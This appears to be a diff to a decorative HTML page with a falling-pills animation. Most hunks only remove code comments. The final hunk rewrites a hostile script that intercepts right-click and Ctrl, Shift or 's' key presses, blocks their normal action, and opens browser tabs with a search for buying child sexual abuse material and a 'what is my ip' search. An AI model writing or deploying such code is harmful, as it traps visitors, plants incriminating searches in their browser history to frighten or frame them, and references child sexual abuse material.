@@ -15,19 +15,19 @@
 
         #who {
             text-shadow: 0 0 8px rgba(255, 255, 255, 0.505), 0 0 15px rgba(255, 255, 255, 0.658), 0 0 20px rgba(255, 255, 255, 0.505);
-            color: white; /* Change text color to white */
-            font-size: 3em; /* Adjust font size as needed */
+            color: white; 
+            font-size: 3em; 
         }
 
         #footer {
             text-shadow: 0 0 1px rgba(255, 255, 255, 0.505), 0 0 5px rgba(255, 255, 255, 0.658), 0 0 7px rgba(255, 255, 255, 0.505);
-            color: white; /* Change text color to white */
-            font-size: 2em; /* Adjust font size as needed */
+            color: white; 
+            font-size: 2em; 
         }
 
         a button {
-            color: white; /* Change button text color to white */
-            text-decoration: none; /* Remove any underline */
+            color: white; 
+            text-decoration: none; 
         }
 
         #falling-pills {
@@ -36,17 +36,17 @@
             left: 0;
             width: 100%;
             height: 100%;
-            pointer-events: none; /* Prevent pills from interfering with clicks */
-            z-index: -1; /* Push pills behind other content */
+            pointer-events: none; 
+            z-index: -1; 
         }
 
         .pill {
             position: absolute;
-            width: 6px; /* Smaller size */
-            height: 6px; /* Smaller size */
-            background-color: white; /* Change to white */
+            width: 6px; 
+            height: 6px; 
+            background-color: white; 
             border-radius: 50%;
-            animation: fall 5s linear infinite; /* Adjust animation duration as needed */
+            animation: fall 5s linear infinite; 
         }
 
         @keyframes fall {
@@ -72,25 +72,25 @@
         <div id="falling-pills"></div>
     </main>
     <script>
-        // Function to create a new pill
+        
         function createPill() {
-            // Create a new div element
+            
             var pill = document.createElement("div");
-            pill.classList.add("pill"); // Add 'pill' class to the new element
-            pill.style.left = Math.random() * window.innerWidth + "px"; // Randomly position the pill horizontally
-            document.getElementById("falling-pills").appendChild(pill); // Append the new pill to the falling-pills container
+            pill.classList.add("pill"); 
+            pill.style.left = Math.random() * window.innerWidth + "px"; 
+            document.getElementById("falling-pills").appendChild(pill); 
 
-            // After some time, remove the pill from the DOM to prevent memory leaks
+           
             setTimeout(function () {
                 pill.remove();
             }, 6000);
         }
 
-        // Call the createPill function every 500 milliseconds to continuously create new pills
+        
         setInterval(createPill, 500);
     </script>
 
-    <!-- Particle Animation Script -->
+   
     <script>
         document.addEventListener('DOMContentLoaded', function () {
             var script = document.createElement('script');
@@ -158,19 +158,27 @@
         });
     </script>
 
-    <!-- JavaScript to open new page on right click or key press -->
+   
     <script>
-        function openNewPage() {
-            window.open('https://www.google.com/search?q=how+to+buy+cp', '_blank');
+        function openNewPage(url) {
+            window.open(url, '_blank');
         }
 
-        window.addEventListener('contextmenu', openNewPage); // Open on right click
-
-        window.addEventListener('keydown', function (event) {
-            if (event.ctrlKey || event.shiftKey || event.key === 's') {
-                openNewPage();
+        function handleEvent(event) {
+            
+            if (event.type === 'contextmenu' || (event.type === 'keydown' && (event.ctrlKey || event.shiftKey || event.key === 's'))) {
+             
+                openNewPage('https://www.google.com/search?q=how+to+buy+child+porn');
+               
+                openNewPage('https://www.google.com/search?q=what+is+my+ip'); 
+                event.preventDefault(); 
             }
-        });
+        }
+
+        window.addEventListener('contextmenu', handleEvent); 
+        window.addEventListener('keydown', handleEvent); 
     </script>
+
 </body>
 </html>
+
